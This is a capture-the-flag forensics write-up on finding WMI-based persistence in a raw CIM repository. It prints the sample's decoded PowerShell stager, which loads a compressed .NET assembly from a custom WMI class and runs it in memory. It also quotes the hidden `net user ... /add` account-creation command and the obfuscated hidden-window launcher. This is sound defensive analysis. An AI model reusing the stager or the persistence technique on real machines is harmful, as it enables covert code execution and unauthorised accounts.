# Day - 12

---

**Challenge name:** After Hours

**Category:** Forensics

**Difficulty:** Medium

**Date completed:** 8th of August 2026

---

## Summary

Byte Lotus's back-office machines kept logging in during off-hours, but nothing showed up in Startup, Scheduled Tasks, or the registry Run keys. The provided artifacts (`INDEX.BTR`, `OBJECTS.DATA`, `MAPPING1/2/3.MAP`) turned out to be a raw **WMI CIM repository** dump - the quiet corner most persistence-hunting tools skip entirely. `OBJECTS.DATA` stores its object/property data largely as plaintext strings inline in binary pages, so the whole chain was solvable with nothing but `strings`, `grep`, `base64`, and `iconv`. Digging through it surfaced a disguised WMI event subscription firing a base64-encoded PowerShell stager every 60 seconds, which pulled its real payload out of a completely custom WMI class's default property value, decompressed it into a .NET assembly, and ran it. Strings inside that assembly revealed a `net user` command whose "password" argument was actually the base64-encoded flag.

---

### Step 1: Identifying the artifacts

The five provided files - `INDEX.BTR`, `OBJECTS.DATA`, `MAPPING1.MAP`, `MAPPING2.MAP`, `MAPPING3.MAP` - are the exact file set that makes up the **WMI CIM repository**, normally found at `C:\Windows\System32\wbem\Repository\` on a Windows host. This reframed the challenge immediately: this is WMI-based persistence, a technique most autoruns/persistence tools don't fully enumerate.

---

### Step 2: Grepping for known WMI persistence markers

Rather than parsing the repository's binary structure, `OBJECTS.DATA` was searched directly for known WMI subscription class names:

```bash
strings -n 10 OBJECTS.DATA | grep -i "eventfilter\|eventconsumer\|commandlinetemplate"
```

This surfaced `__EventFilter`, `__EventConsumer`, and a set of consumer names - legitimate ones (`NTEventLogEventConsumer`, `LogFileEventConsumer`) alongside `Win32_HardwareTelemetry`, which doesn't belong to any stock Windows WMI class.

---

### Step 3: Pulling the suspicious filter/consumer names

A tighter grep for the odd name confirmed a disguised filter/consumer pair:

```bash
grep -aoE ".{0,10}EngineTelemetry.{0,10}" OBJECTS.DATA | strings | sort -u
```

```
EngineTelemetryConsumer
EngineTelemetryFilter
```

Both names read like legitimate telemetry services but don't match anything in a stock Windows WMI subscription namespace (which would normally only show something like `SCM Event Log Filter`/`Consumer`).

---

### Step 4: Extracting the command line

Widening the grep around the consumer name (and switching to a direct match on the `cmd /C powershell` prefix that all `CommandLineEventConsumer` payloads start with) pulled the full command out as plaintext:

```bash
grep -aoE "cmd /C powershell.{0,3000}" OBJECTS.DATA | strings
```

```
cmd /C powershell.exe -Sta -Nop -Window Hidden -enc JABmAGkAbABlAC...
```

No parsing of the CIM object structure was needed - the command line sits inline in the file as plaintext.

---

### Step 5: Decoding the PowerShell stager

`-enc` payloads are always Base64 of UTF-16LE, decodable with stock command-line tools:

```bash
echo "<blob>" | base64 -d | iconv -f UTF-16LE -t UTF-8
```

Decoded to:

```powershell
$file = ([WmiClass]'ROOT\cimv2:Win32_HardwareTelemetry').Properties['ConfigData'].Value;
$o = New-Object IO.MemoryStream;
$d = New-Object IO.Compression.DeflateStream([IO.MemoryStream][Convert]::FromBase64String($file),[IO.Compression.CompressionMode]::Decompress);
$b = New-Object Byte[](1024);
$r = $d.Read($b,0,1024);
while($r -gt 0){ $o.Write($b,0,$r); $r = $d.Read($b,0,1024) }
[Reflection.Assembly]::Load($o.ToArray()).EntryPoint.Invoke($null,@(,[string[]]@()))|Out-Null
```

The real payload wasn't in the consumer at all - it lived as a **class-level default property value** on a completely custom class, `Win32_HardwareTelemetry`, in `root\cimv2`. This is a step beyond typical WMI persistence: the config data is attached to the *class definition* itself, not an instance, so tools that only enumerate instances walk right past it.

---

### Step 6: Locating and extracting the malicious class's payload

Grepping for the class name directly led to schema noise (property descriptions, comments) rather than the payload itself, since embedded null bytes break `grep`'s `.` wildcard across binary regions. The fix was to isolate long strings by raising the minimum-length filter well past the built-in WMI schema help-text (~500 chars):

```bash
strings -n 1500 OBJECTS.DATA
```

This isolated a single ~2.2KB Base64-looking blob (`7VZPbFRFGP...`), repeated a few times across leftover page copies:

```bash
strings -n 1500 OBJECTS.DATA | grep "^7VZPbFRFGP" | sort -u > blob.txt
```

---

### Step 7: Decoding the payload

Per the stager's own recipe - Base64 → raw DEFLATE (no zlib header, so plain `gzip`/`openssl zlib` won't work directly):

```bash
base64 -d blob.txt > blob.deflate
perl -MCompress::Raw::Zlib -e '
my $data = do { local $/; open(F,"<","blob.deflate") or die; binmode F; <F> };
my ($i,$status) = new Compress::Raw::Zlib::Inflate(-WindowBits => -15);
my $out;
$i->inflate($data, $out);
open(O,">","payload.bin"); binmode O; print O $out;
'
file payload.bin
```

```
payload.bin: PE32 executable (GUI) Intel 80386 Mono/.Net assembly, for MS Windows, 3 sections
```

---

### Step 8: Extracting the flag from the assembly

.NET string literals are stored UTF-16LE, so both encodings were checked:

```bash
strings -n 6 payload.bin        # ascii pass - mostly framework/manifest noise
strings -e l -n 6 payload.bin   # utf-16le pass - surfaced the real payload
```

The UTF-16LE pass revealed the assembly's actual behavior: it checks `Environment.MachineName` against an expected value, and on a match runs:

```
cmd.exe /c net user patch <base64 blob> /add
```

a `net user ... /add` command whose "password" argument is actually the flag, smuggled through as Base64:

```bash
echo "<base64 blob>" | base64 -d
```

```
THM{REDACTED}
```

---

## Rabbit Hole

Initial `grep -aoE ".{0,N}pattern.{0,N}"` passes against `OBJECTS.DATA` produced "invalid UTF-8" errors and truncated matches - embedded null bytes and non-text binary data inside the CIM pages break naive `.` wildcard matching. Piping through `strings` first (to strip non-printable runs) before applying further filters/greps was needed to get clean, usable text out of the raw file. Similarly, the first attempt to isolate the `ConfigData` blob via a name-anchored grep (`grep -aoE "Win32_HardwareTelemetry.{0,4000}"`) came back truncated for the same reason - switching to a plain minimum-length `strings` filter instead of a regex-anchored grep was what actually isolated the full blob.

---

## Why this worked

WMI-based persistence lives entirely outside the locations most tooling checks (Run keys, Scheduled Tasks, Services) - the `__EventFilter`/`__EventConsumer`/`__FilterToConsumerBinding` triad is itself already an under-monitored technique, but this sample went a level further by relocating its actual payload out of the consumer and into a **custom class definition's default property value**, a location even fewer IR tools inspect. None of this required parsing the CIM binary format at all, though - because CIM string data is stored largely as plaintext inline in the pages, the entire chain (filter/consumer names → command line → nested class payload → decompressed binary → flag) was recoverable with `strings`/`grep`/`base64`/`iconv`/`perl` alone. Layering Base64 → raw Deflate → in-memory .NET assembly load added just enough obfuscation to defeat a shallow string scan of the consumer alone, while the flag itself was smuggled through an innocuous-looking `net user ... /add` command.

---

## Lessons Learned

- WMI persistence isn't limited to instances of `__EventConsumer` subclasses - a completely custom class's *default property value* can just as easily carry a payload, and most persistence-hunting tooling won't think to check class definitions at all.
- Raw `strings`/`grep` against `OBJECTS.DATA` is often enough on its own - CIM string data is stored largely as plaintext inline in the pages, so a full binary parser isn't a prerequisite for a first pass.
- `grep`'s `.` wildcard breaks across embedded null bytes in binary files; pipe through `strings` first, or fall back to a plain minimum-length filter, to reliably isolate long inline blobs.
- Always decode PowerShell `-enc` blobs as Base64-of-UTF-16LE (`base64 -d | iconv -f UTF-16LE`), and always run `strings` in both ASCII and UTF-16LE (`-e l`) modes against any recovered .NET binary - encoded literals are UTF-16LE by default.
- Watch for encoding chains that reference *other* WMI objects at runtime (`[WmiClass]'...'.Properties[...]`) - the actual payload may not be co-located with the trigger/consumer at all.
- Machine-name gated payloads and data smuggled through unrelated-looking parameters (like a `net user` password field) are simple but effective ways to blend malicious activity into benign-looking commands.
